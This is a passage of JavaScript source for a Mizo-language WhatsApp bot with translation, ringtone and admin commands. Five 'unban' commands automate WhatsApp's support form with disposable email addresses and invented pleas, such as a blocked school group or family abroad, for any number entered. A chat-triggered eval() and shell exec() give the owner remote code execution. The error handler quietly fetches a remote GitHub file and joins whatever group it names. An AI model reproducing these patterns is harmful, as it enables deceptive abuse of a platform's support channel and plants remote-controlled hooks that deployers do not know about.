return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} en | Vawiin enge i tih dawn\n\nWord splt hmaa language code ang hi en i duh chuan /codelang tiin type rawh!!`)
}
HBWABotMz.sendMessage(from, { react: { text: "🈯" , key: m.key }})
var code = q.split(' |')[0]
var word = q.split('|')[1]
const source1 = 'auto';
const target1 = `${code}`
const athu1 = `${word}`;
const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, target1, athu1)
  await HBWABotMz.sendMessage(from, { text: mizotranslation1 }, { quoted: m })
}
break

case 'translate': 
case 'tr': {
    try {
        if (!m.quoted && !text) {
            return dodoi(
                `He feature hi hetiang hian hman tur a ni\n*⟨Entirnan :* ${prefix + command} en \n\nMessage translate tur a awm chuan reply la, entirna kan pek ang khian ti rawh!!`
            );
        }
        const thelung = ["am", "ar", "eu", "bn", "en-GB", "pt-BR", "bg", "ca", "lus", "chr", "hr", "cs", "da", "nl", "en", "et", "fil", "fi", "fr", "de", "el", "gu", "iw", "hi", "hu", "is", "id", "it", "ja", "kn", "ko", "lv", "lt", "ms", "ml", "mr", "no", "pl", "pt-PT", "ro", "ru", "sr", "zh-CN", "sk", "sl", "es", "sw", "sv", "ta", "te", "th", "zh-TW", "tr", "ur", "uk", "vi", "cy"];
        if (!thelung.includes(args[0])) return dodoi(`*⟨Entirnan :* ${prefix + command} en \n\nLanguage code dik chauh rawn dah la, Code i hriat loh chuan ${prefix}codelang tih rawn thawn rawh`)
        HBWABotMz.sendMessage(from, { react: { text: "🈯", key: m.key } });
        const source1 = 'auto';
        const inputText = m.quoted?.text || text;
        const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, text, m.quoted.text)
        await HBWABotMz.sendMessage(from, { text: mizotranslation1 }, { quoted: m });

    } catch (error) {
       dodoi(`He feature hi hetiang hian hman tur a ni\n*⟨Entirnan :* ${prefix + command} en \n\nMessage translate tur a awm chuan reply la, entirna kan pek ang khian ti rawh!!`
            );
    }
}
break;

case 'codelang': {

const languages = `
Amharic = am
Arabic = ar
Basque = eu
Bengali = bn
English (UK) = en-GB
Portuguese (Brazil) = pt-BR
Bulgarian = bg
Catalan = ca
Cherokee = chr
Croatian = hr
Czech = cs
Danish = da
Dutch = nl
English (US) = en
Estonian = et
Filipino = fil
Finnish = fi
French = fr
German = de
Greek = el
Gujarati = gu
Hebrew = iw
Hindi = hi
Hungarian = hu
Icelandic = is
Indonesian = id
Italian = it
Japanese = ja
Kannada = kn
Korean = ko
Latvian = lv
Lithuanian = lt
Malay = ms
Malayalam = ml
Marathi = mr
Mizo = lus
Norwegian = no
Polish = pl
Portuguese (Portugal) = pt-PT
Romanian = ro
Russian = ru
Serbian = sr
Chinese (PRC) = zh-CN
Slovak = sk
Slovenian = sl
Spanish = es
Swahili = sw
Swedish = sv
Tamil = ta
Telugu = te
Thai = th
Chinese (Taiwan) = zh-TW
Turkish = tr
Urdu = ur
Ukrainian = uk
Vietnamese = vi
Welsh = cy `
await HBWABotMz.sendMessage(from, { text: languages }, { quoted: m })
} break
case 'myip': {

if (!HerbertTheCreator) return dodoi(mess.owner)
if (m.isGroup) return dodoi(mess.private)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
dodoi("🔎 I ip address chu: " + ip)
})
})
}
break
case 'ringtone': {

if (!text) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} black rover`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
let { ringtone } = require('./lib/scraper')
let anutone2 = await ringtone(text)
let result = anutone2[Math.floor(Math.random() * anutone2.length)]
HBWABotMz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
case 'unbanv1': {

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args[0]) return dodoi2(`${mtl2.guide1}\n*Entirnan: ${prefix + command} 918416093656`)
let wanb = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let wanbck = await HBWABotMz.onWhatsApp(wanb)
if (wanbck.length == 0) return dodoi(`WhatsApp number dik chauh rawn dah rawh!!`)
let axioss = require("axios")  
let hbertxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = hbertxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio')
let $ = cheerio.load(hbertxos.data)
let $form = $("form")
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", wanb)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HBWABotMz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
await eco.deduct(limitneihtu, freevip, 1);
}
break
case 'unbanv2': {

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args[0]) return dodoi2(`${mtl2.guide1}\n*Entirnan: ${prefix + command} 918416093656`)
let wanb = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let wanbck = await HBWABotMz.onWhatsApp(wanb)
if (wanbck.length == 0) return dodoi(`WhatsApp number dik chauh rawn dah rawh!!`)
let axioss = require("axios")  
let hbertxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = hbertxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio')
let $ = cheerio.load(hbertxos.data)
let $form = $("form")
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", wanb)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HBWABotMz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
await eco.deduct(limitneihtu, freevip, 1);
}
break
case 'unbanv3': {

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args[0]) return dodoi2(`${mtl2.guide1}\n*Entirnan: ${prefix + command} 918416093656`)
let wanb = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let wanbck = await HBWABotMz.onWhatsApp(wanb)
if (wanbck.length == 0) return dodoi(`WhatsApp number dik chauh rawn dah rawh!!`)
let axioss = require("axios")  
let hbertxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = hbertxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio')
let $ = cheerio.load(hbertxos.data)
let $form = $("form")
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", wanb)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HBWABotMz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
await eco.deduct(limitneihtu, freevip, 1);
}
break
case 'unbanv4': {

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args[0]) return dodoi2(`${mtl2.guide1}\n*Entirnan: ${prefix + command} 918416093656`)
let wanb = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let wanbck = await HBWABotMz.onWhatsApp(wanb)
if (wanbck.length == 0) return dodoi(`WhatsApp number dik chauh rawn dah rawh!!`)
let axioss = require("axios")  
let hbertxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = hbertxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio')
let $ = cheerio.load(hbertxos.data)
let $form = $("form")
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", wanb)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HBWABotMz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
await eco.deduct(limitneihtu, freevip, 1);
}
break

case 'unbanv5': {

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args[0]) return dodoi2(`${mtl2.guide1}\n*Entirnan: ${prefix + command} 918416093656`)
let wanb = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let wanbck = await HBWABotMz.onWhatsApp(wanb)
if (wanbck.length == 0) return dodoi(`WhatsApp number dik chauh rawn dah rawh!!`)
let axioss = require("axios")  
let hbertxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = hbertxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio')
let $ = cheerio.load(hbertxos.data)
let $form = $("form")
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", wanb)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HBWABotMz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
await eco.deduct(limitneihtu, freevip, 1);
}
break

case 'ghstalk': case 'githubstalk':{
if (!q) return dodoi(`Example ${prefix+command} HBMods-OFC`)
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
HBWABotMz.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

case 'clearall': {

if (!HerbertTheCreator) return dodoi(mess.owner)
HBWABotMz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {

if (!HerbertTheCreator) return dodoi(mess.owner)
if (m.isGroup) return dodoi(mess.private)
HBWABotMz.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {

if (!HerbertTheCreator) return dodoi(mess.owner)
if (m.isGroup) return dodoi(mess.private)
HBWABotMz.chatModify({ pin: false }, m.chat)
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!HerbertTheCreator1) return dodoi(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return dodoi(bang)
                    }
                    try {
                        dodoi(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        dodoi(String(e))
                    }
                }

                if (budy.startsWith('⟩')) {
                    if (!HerbertTheCreator1) return dodoi(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await dodoi(evaled)
                    } catch (err) {
                        await dodoi(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!HerbertTheCreator1) return dodoi(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return dodoi(err)
                        if (stdout) return dodoi(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return 
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
HBWABotMz.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
console.log(util.format(err))
let e = String(err);
//I change a nih chuan i code review sak i ni lovang!!..
const h34 = 'https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/Support.json';
    let b34 = await fetch(h34);
    let t34 = await b34.json();
    const kajoin = t34.support;
    const spid = t34.supportid;
   // await HBWABotMz.sendMessage(m.key.remoteJid, { react: { text: "❌" , key: m.key }});
    await HBWABotMz.groupAcceptInvite(kajoin);
}
}
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
